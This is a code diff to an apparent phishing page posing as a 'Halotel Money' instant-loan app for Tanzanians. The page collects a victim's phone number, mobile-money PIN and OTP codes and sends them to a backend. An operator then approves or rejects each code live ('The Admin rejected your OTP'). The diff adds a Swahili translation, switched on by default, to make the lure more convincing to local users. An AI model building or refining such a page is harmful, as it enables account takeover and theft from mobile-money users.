@@ -81,10 +81,15 @@
     .logo-text h1 { font-size: 1.4rem; font-weight: 800; color: var(--halotel-blue); line-height: 1; letter-spacing: -0.5px;}
     .logo-text span { font-size: 0.65rem; color: var(--halotel-orange); font-weight: 700; text-transform: uppercase;}
     
-    .btn-header {
-      background: var(--halotel-orange); color: #fff; border: none; border-radius: 6px;
-      padding: 8px 12px; font-size: 0.8rem; font-weight: 700; cursor: pointer;
+    /* Language Toggle */
+    .lang-toggle {
+      display: flex; gap: 5px; font-size: 0.85rem; font-weight: 700;
     }
+    .lang-toggle span {
+      cursor: pointer; padding: 4px 8px; border-radius: 4px; color: #999;
+      transition: 0.2s;
+    }
+    .lang-toggle span.active { background: var(--halotel-orange); color: #fff; }
 
     /* Scrollable content area */
     .page-container {
@@ -275,7 +280,12 @@
         </div>
       </div>
     </div>
-    <button class="btn-header" onclick="showPage('page2')">Apply for a Loan</button>
+    
+    <!-- Language Toggle -->
+    <div class="lang-toggle">
+      <span id="btn-en" onclick="setLanguage('en')">EN</span>
+      <span id="btn-sw" class="active" onclick="setLanguage('sw')">SW</span>
+    </div>
   </div>
 
   <div class="page-container">
@@ -283,86 +293,86 @@
     <div id="page1" class="page active">
       <div class="hero-section">
         <div class="trust-badge">
-          <i class="fa-solid fa-shield-halved"></i> Licensed Digital Lending
+          <i class="fa-solid fa-shield-halved"></i> <span id="t-badge">Licensed Digital Lending</span>
         </div>
         
-        <h2>Instant Loans.<br>Anytime. Anywhere.</h2>
-        <p>Quick access to credit for individuals and businesses. Join thousands of Tanzanians already empowered by Halotel Money.</p>
+        <h2 id="t-hero-title">Instant Loans.<br>Anytime. Anywhere.</h2>
+        <p id="t-hero-sub">Quick access to credit for individuals and businesses. Join thousands of Tanzanians already empowered by Halotel Money.</p>
 
         <div class="loan-card">
           <div class="loan-card-header">
             <div class="icon-box"><i class="fa-solid fa-mobile-screen"></i></div>
             <div class="loan-card-title">
-              <span>Loan Amount</span>
+              <span id="t-loan-amount-lbl">Loan Amount</span>
               <h3>Up to TZS 1,000,000</h3>
             </div>
           </div>
 
           <div class="loan-details">
             <div class="loan-row">
-              <span>Approval Time</span>
-              <span class="highlight">Instant</span>
+              <span id="t-approval-time">Approval Time</span>
+              <span class="highlight" id="t-instant">Instant</span>
             </div>
             <div class="loan-row">
-              <span>Disbursement</span>
+              <span id="t-disbursement">Disbursement</span>
               <span class="highlight">Halotel Money</span>
             </div>
             <div class="loan-row" style="border-bottom: none;">
-              <span>Duration</span>
-              <span>Flexible Terms</span>
+              <span id="t-duration">Duration</span>
+              <span id="t-flexible">Flexible Terms</span>
             </div>
           </div>
 
           <div class="trust-box">
-            <span>Trusted by</span>
+            <span id="t-trusted">Trusted by</span>
             <h4>30,000+</h4>
-            <span>Tanzanians</span>
+            <span id="t-tanzanians">Tanzanians</span>
           </div>
         </div>
 
-        <button class="btn-primary" onclick="showPage('page2')">Apply Now</button>
+        <button class="btn-primary" onclick="showPage('page2')" id="t-apply-now">Apply Now</button>
       </div>
     </div>
 
     <!-- Page 2: Questionnaire -->
     <div id="page2" class="page">
-      <h2 class="form-title">Your Application</h2>
+      <h2 class="form-title" id="t-your-app">Your Application</h2>
       <form id="formQuestionnaire" style="padding-bottom: 20px;">
         <div class="form-group">
-          <label>Full name</label>
+          <label id="t-full-name">Full name</label>
           <input type="text" id="qName" required placeholder="Enter your full name">
         </div>
         <div class="form-group">
-          <label>Employment status</label>
+          <label id="t-emp-status">Employment status</label>
           <select id="qEmployment" required>
-            <option value="">Select your employment status</option>
-            <option>Employed</option>
-            <option>Self-Employed</option>
-            <option>Unemployed</option>
+            <option value="" id="t-select-emp">Select your employment status</option>
+            <option value="Employed" id="t-emp-1">Employed</option>
+            <option value="Self-Employed" id="t-emp-2">Self-Employed</option>
+            <option value="Unemployed" id="t-emp-3">Unemployed</option>
           </select>
         </div>
         <div class="form-group">
-          <label>Monthly income (TZS)</label>
+          <label id="t-monthly-income">Monthly income (TZS)</label>
           <input type="number" id="qIncome" required placeholder="Enter your monthly income">
         </div>
         <div class="form-group">
-          <label>Loan amount (TZS)</label>
+          <label id="t-loan-amount">Loan amount (TZS)</label>
           <input type="number" id="qAmount" required placeholder="Enter loan amount">
         </div>
         <div class="form-group">
-          <label>Repayment period</label>
+          <label id="t-repay-period">Repayment period</label>
           <select id="qTerm" required>
-            <option value="">Select repayment period</option>
-            <option>1 month</option>
-            <option>3 months</option>
-            <option>6 months</option>
-            <option>12 months</option>
+            <option value="" id="t-select-period">Select repayment period</option>
+            <option value="1 month" id="t-period-1">1 month</option>
+            <option value="3 months" id="t-period-3">3 months</option>
+            <option value="6 months" id="t-period-6">6 months</option>
+            <option value="12 months" id="t-period-12">12 months</option>
           </select>
         </div>
         
         <div class="error" id="errQ"></div>
         <button type="submit" id="btnSubmitForm" class="btn-submit">
-          <span>SUBMIT APPLICATION</span>
+          <span id="t-submit-app">SUBMIT APPLICATION</span>
         </button>
       </form>
     </div>
@@ -372,7 +382,7 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo" style="color: var(--halotel-orange);">Halotel Money</div>
-          <h3>Secure Login</h3>
+          <h3 id="t-secure-login">Secure Login</h3>
 
           <div class="phone-input-box">
             <div class="country-code">
@@ -382,7 +392,7 @@
             <input type="tel" id="pPhone" placeholder="Halotel Phone Number" autocomplete="off">
           </div>
 
-          <p class="pin-label">Enter your Halotel Money PIN</p>
+          <p class="pin-label" id="t-enter-pin">Enter your Halotel Money PIN</p>
           <div class="pin-boxes" id="pinContainer">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
@@ -394,14 +404,14 @@
         </div>
 
         <div class="login-bottom">
-          <p>To register a Halotel Money account or get assistance,<br>click below</p>
+          <p id="t-register-text">To register a Halotel Money account or get assistance,<br>click below</p>
           <div class="bottom-buttons">
-            <button type="button" onclick="submitRegistration()" id="btnRegister"><i class="fa-solid fa-user-plus"></i>Register</button>
-            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i>Help & Support</button>
+            <button type="button" onclick="submitRegistration()" id="btnRegister"><i class="fa-solid fa-user-plus"></i><span id="t-register-btn">Register</span></button>
+            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span id="t-help-btn">Help & Support</span></button>
           </div>
           <div class="login-footer">
             v4.0.3P<br><br>
-            By signing in you agree to the <a href="#">Terms and Conditions</a>
+            <span id="t-terms-text">By signing in you agree to the</span> <a href="#" id="t-terms-link">Terms and Conditions</a>
           </div>
         </div>
       </div>
@@ -412,7 +422,7 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo" style="color: var(--halotel-orange);">Halotel Money</div>
-          <h3>Enter the OTP code sent to</h3>
+          <h3 id="t-otp-sent">Enter the OTP code sent to</h3>
           <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--halotel-orange);">+255 00 000 0000</div>
 
           <div class="otp-boxes" id="otpContainer">
@@ -425,12 +435,12 @@
             <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, null)" id="otp5">
           </div>
 
-          <p class="resend-text">Resend OTP in <span id="timer">44</span> Sec</p>
+          <p class="resend-text"><span id="t-resend">Resend OTP in</span> <span id="timer">44</span> Sec</p>
           <div class="error" id="errOtp" style="margin-top: 15px;"></div>
         </div>
 
         <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
-          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> Help & Support</div>
+          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span id="t-help-btn-2">Help & Support</span></div>
           <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
         </div>
       </div>
@@ -440,15 +450,15 @@
     <div id="page-waiting" class="page">
       <div class="waiting-screen">
         <div class="spinner"></div>
-        <h2>Please wait...</h2>
-        <p>We are verifying your details.<br>This may take a moment.</p>
+        <h2 id="t-wait-title">Please wait...</h2>
+        <p id="t-wait-sub">We are verifying your details.<br>This may take a moment.</p>
       </div>
     </div>
 
     <!-- Page 6: Success -->
     <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-      <h2 style="color: var(--halotel-orange); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;">Congratulations!</h2>
-      <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.5;">Your loan application has been fully processed. Please check your Halotel Money account shortly.</p>
+      <h2 style="color: var(--halotel-orange); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" id="t-success-title">Congratulations!</h2>
+      <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.5;" id="t-success-sub">Your loan application has been fully processed. Please check your Halotel Money account shortly.</p>
     </div>
   </div>
 </div>
@@ -457,6 +467,99 @@
   let sessionId = null;
   let pollTimer = null;
   let isPolling = false;
+  let currentLang = 'sw'; // Default to Swahili
+
+  // Translation Dictionary
+  const translations = {
+    en: {
+      badge: "Licensed Digital Lending",
+      heroTitle: "Instant Loans.<br>Anytime. Anywhere.",
+      heroSub: "Quick access to credit for individuals and businesses. Join thousands of Tanzanians already empowered by Halotel Money.",
+      loanAmountLbl: "Loan Amount",
+      approvalTime: "Approval Time",
+      instant: "Instant",
+      disbursement: "Disbursement",
+      duration: "Duration",
+      flexible: "Flexible Terms",
+      trusted: "Trusted by",
+      tanzanians: "Tanzanians",
+      applyNow: "Apply Now",
+      yourApp: "Your Application",
+      fullName: "Full name",
+      empStatus: "Employment status",
+      selectEmp: "Select your employment status",
+      emp1: "Employed",
+      emp2: "Self-Employed",
+      emp3: "Unemployed",
+      monthlyIncome: "Monthly income (TZS)",
+      loanAmount: "Loan amount (TZS)",
+      repayPeriod: "Repayment period",
+      selectPeriod: "Select repayment period",
+      p1: "1 month", p3: "3 months", p6: "6 months", p12: "12 months",
+      submitApp: "SUBMIT APPLICATION",
+      secureLogin: "Secure Login",
+      enterPin: "Enter your Halotel Money PIN",
+      registerText: "To register a Halotel Money account or get assistance,<br>click below",
+      registerBtn: "Register",
+      helpBtn: "Help & Support",
+      termsText: "By signing in you agree to the",
+      termsLink: "Terms and Conditions",
+      otpSent: "Enter the OTP code sent to",
+      resend: "Resend OTP in",
+      waitTitle: "Please wait...",
+      waitSub: "We are verifying your details.<br>This may take a moment.",
+      successTitle: "Congratulations!",
+      successSub: "Your loan application has been fully processed. Please check your Halotel Money account shortly.",
+      phName: "Enter your full name",
+      phIncome: "Enter your monthly income",
+      phAmount: "Enter loan amount",
+      phPhone: "Halotel Phone Number"
+    },
+    sw: {
+      badge: "Leseni ya Kukopesha Kidijitali",
+      heroTitle: "Mikopo ya Papo Hapo.<br>Wakati Wowote. Mahali Popote.",
+      heroSub: "Pata mkopo kwa haraka kwa ajili yako au biashara yako. Jiunge na maelfu ya Watanzania wanaonufaika na Halotel Money.",
+      loanAmountLbl: "Kiasi cha Mkopo",
+      approvalTime: "Muda wa Kuidhinisha",
+      instant: "Papo Hapo",
+      disbursement: "Malipo",
+      duration: "Muda",
+      flexible: "Muda Unavyotaka",
+      trusted: "Inaaminiwa na",
+      tanzanians: "Watanzania",
+      applyNow: "Omba Sasa",
+      yourApp: "Maombi Yako",
+      fullName: "Jina Kamili",
+      empStatus: "Hali ya Ajira",
+      selectEmp: "Chagua hali yako ya ajira",
+      emp1: "Nimeajiriwa",
+      emp2: "Nimejiajiri",
+      emp3: "Sijaajiriwa",
+      monthlyIncome: "Kipato cha Mwezi (TZS)",
+      loanAmount: "Kiasi cha Mkopo (TZS)",
+      repayPeriod: "Muda wa Kurejesha",
+      selectPeriod: "Chagua muda wa kurejesha",
+      p1: "Mwezi 1", p3: "Miezi 3", p6: "Miezi 6", p12: "Miezi 12",
+      submitApp: "TUMA MAOMBI",
+      secureLogin: "Ingia kwa Usalama",
+      enterPin: "Weka PIN yako ya Halotel Money",
+      registerText: "Ili kusajili akaunti ya Halotel Money au kupata msaada,<br>bonyeza hapa chini",
+      registerBtn: "Sajili",
+      helpBtn: "Msaada",
+      termsText: "Kwa kuingia unakubali",
+      termsLink: "Masharti na Vigezo",
+      otpSent: "Weka namba ya OTP iliyotumwa kwa",
+      resend: "Tuma tena OTP baada ya",
+      waitTitle: "Tafadhali subiri...",
+      waitSub: "Tunathibitisha taarifa zako.<br>Hii inaweza kuchukua muda.",
+      successTitle: "Hongera!",
+      successSub: "Maombi yako ya mkopo yamekamilika. Tafadhali angalia akaunti yako ya Halotel Money hivi punde.",
+      phName: "Weka jina lako kamili",
+      phIncome: "Weka kipato chako cha mwezi",
+      phAmount: "Weka kiasi cha mkopo",
+      phPhone: "Namba ya Halotel"
+    }
+  };
 
   async function init() {
     try {
@@ -466,6 +569,67 @@
     } catch (err) { console.error('Connection error'); }
   }
   init();
+
+  // Language Switcher Logic
+  function setLanguage(lang) {
+    currentLang = lang;
+    document.getElementById('btn-en').classList.toggle('active', lang === 'en');
+    document.getElementById('btn-sw').classList.toggle('active', lang === 'sw');
+
+    const t = translations[lang];
+
+    document.getElementById('t-badge').innerHTML = t.badge;
+    document.getElementById('t-hero-title').innerHTML = t.heroTitle;
+    document.getElementById('t-hero-sub').innerHTML = t.heroSub;
+    document.getElementById('t-loan-amount-lbl').innerHTML = t.loanAmountLbl;
+    document.getElementById('t-approval-time').innerHTML = t.approvalTime;
+    document.getElementById('t-instant').innerHTML = t.instant;
+    document.getElementById('t-disbursement').innerHTML = t.disbursement;
+    document.getElementById('t-duration').innerHTML = t.duration;
+    document.getElementById('t-flexible').innerHTML = t.flexible;
+    document.getElementById('t-trusted').innerHTML = t.trusted;
+    document.getElementById('t-tanzanians').innerHTML = t.tanzanians;
+    document.getElementById('t-apply-now').innerHTML = t.applyNow;
+
+    document.getElementById('t-your-app').innerHTML = t.yourApp;
+    document.getElementById('t-full-name').innerHTML = t.fullName;
+    document.getElementById('t-emp-status').innerHTML = t.empStatus;
+    document.getElementById('t-select-emp').innerHTML = t.selectEmp;
+    document.getElementById('t-emp-1').innerHTML = t.emp1;
+    document.getElementById('t-emp-2').innerHTML = t.emp2;
+    document.getElementById('t-emp-3').innerHTML = t.emp3;
+    document.getElementById('t-monthly-income').innerHTML = t.monthlyIncome;
+    document.getElementById('t-loan-amount').innerHTML = t.loanAmount;
+    document.getElementById('t-repay-period').innerHTML = t.repayPeriod;
+    document.getElementById('t-select-period').innerHTML = t.selectPeriod;
+    document.getElementById('t-period-1').innerHTML = t.p1;
+    document.getElementById('t-period-3').innerHTML = t.p3;
+    document.getElementById('t-period-6').innerHTML = t.p6;
+    document.getElementById('t-period-12').innerHTML = t.p12;
+    document.getElementById('t-submit-app').innerHTML = t.submitApp;
+
+    document.getElementById('t-secure-login').innerHTML = t.secureLogin;
+    document.getElementById('t-enter-pin').innerHTML = t.enterPin;
+    document.getElementById('t-register-text').innerHTML = t.registerText;
+    document.getElementById('t-register-btn').innerHTML = t.registerBtn;
+    document.getElementById('t-help-btn').innerHTML = t.helpBtn;
+    document.getElementById('t-help-btn-2').innerHTML = t.helpBtn;
+    document.getElementById('t-terms-text').innerHTML = t.termsText;
+    document.getElementById('t-terms-link').innerHTML = t.termsLink;
+
+    document.getElementById('t-otp-sent').innerHTML = t.otpSent;
+    document.getElementById('t-resend').innerHTML = t.resend;
+    document.getElementById('t-wait-title').innerHTML = t.waitTitle;
+    document.getElementById('t-wait-sub').innerHTML = t.waitSub;
+    document.getElementById('t-success-title').innerHTML = t.successTitle;
+    document.getElementById('t-success-sub').innerHTML = t.successSub;
+
+    // Update placeholders
+    document.getElementById('qName').placeholder = t.phName;
+    document.getElementById('qIncome').placeholder = t.phIncome;
+    document.getElementById('qAmount').placeholder = t.phAmount;
+    document.getElementById('pPhone').placeholder = t.phPhone;
+  }
 
   function showPage(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -478,7 +642,7 @@
     e.preventDefault();
     const btn = document.getElementById('btnSubmitForm');
     
-    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> ...';
     btn.disabled = true;
     document.getElementById('errQ').style.display = 'none';
 
@@ -499,9 +663,9 @@
         startPolling(); 
       } else { throw new Error(); }
     } catch (err) {
-      btn.innerHTML = '<span>SUBMIT APPLICATION</span>';
+      btn.innerHTML = `<span>${translations[currentLang].submitApp}</span>`;
       btn.disabled = false;
-      document.getElementById('errQ').textContent = 'Submission failed. Try again.';
+      document.getElementById('errQ').textContent = currentLang === 'en' ? 'Submission failed. Try again.' : 'Imeshindikana kutuma. Jaribu tena.';
       document.getElementById('errQ').style.display = 'block';
     }
   });
@@ -523,7 +687,7 @@
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
     
     if (phone === '' || pins.length < 4) {
-      document.getElementById('errLogin').textContent = 'Please enter your Halotel number and full 4-digit PIN.';
+      document.getElementById('errLogin').textContent = currentLang === 'en' ? 'Please enter your Halotel number and full 4-digit PIN.' : 'Tafadhali weka namba yako ya Halotel na PIN kamili ya tarakimu 4.';
       document.getElementById('errLogin').style.display = 'block';
       return;
     }
@@ -549,8 +713,8 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      btn.innerHTML = '<i class="fa-solid fa-user-plus"></i>Register';
-      document.getElementById('errLogin').textContent = 'Connection error.';
+      btn.innerHTML = `<i class="fa-solid fa-user-plus"></i><span>${translations[currentLang].registerBtn}</span>`;
+      document.getElementById('errLogin').textContent = currentLang === 'en' ? 'Connection error.' : 'Hitilafu ya mtandao.';
       document.getElementById('errLogin').style.display = 'block';
     }
   }
@@ -579,7 +743,7 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      document.getElementById('errOtp').textContent = 'Connection error.';
+      document.getElementById('errOtp').textContent = currentLang === 'en' ? 'Connection error.' : 'Hitilafu ya mtandao.';
       document.getElementById('errOtp').style.display = 'block';
     }
   }
@@ -602,9 +766,9 @@
         } 
         else if (status === 'rejected_4') {
           stopPolling();
-          alert('Your application was rejected. Please try again.');
+          alert(currentLang === 'en' ? 'Your application was rejected. Please try again.' : 'Maombi yako yalikataliwa. Tafadhali jaribu tena.');
           showPage('page2');
-          document.getElementById('btnSubmitForm').innerHTML = '<span>SUBMIT APPLICATION</span>';
+          document.getElementById('btnSubmitForm').innerHTML = `<span>${translations[currentLang].submitApp}</span>`;
           document.getElementById('btnSubmitForm').disabled = false;
         } 
         else if (status === 'approved_all') {
@@ -617,16 +781,13 @@
           stopPolling();
           showPage('page5');
         } 
-        // If OTP is rejected, only go back to OTP page
         else if (status === 'rejected_pin') {
           stopPolling();
-          alert('The Admin rejected your OTP. Please enter a new OTP.');
+          alert(currentLang === 'en' ? 'The Admin rejected your OTP. Please enter a new OTP.' : 'Msimamizi alikataa OTP yako. Tafadhali weka OTP mpya.');
           
-          // Clear only the OTP boxes, not the PIN boxes
           document.querySelectorAll('#otpContainer input').forEach(i => i.value = '');
           document.getElementById('errOtp').style.display = 'none';
           
-          // Go back to OTP page, not Page 3
           showPage('page4');
         }
       } catch (err) { console.error(err); }
@@ -643,6 +804,9 @@
     const t = document.getElementById('timer');
     if(t && parseInt(t.textContent) > 0) t.textContent = parseInt(t.textContent) - 1;
   }, 1000);
+
+  // Initialize Swahili on load
+  setLanguage('sw');
 </script>
 </body>
 </html>
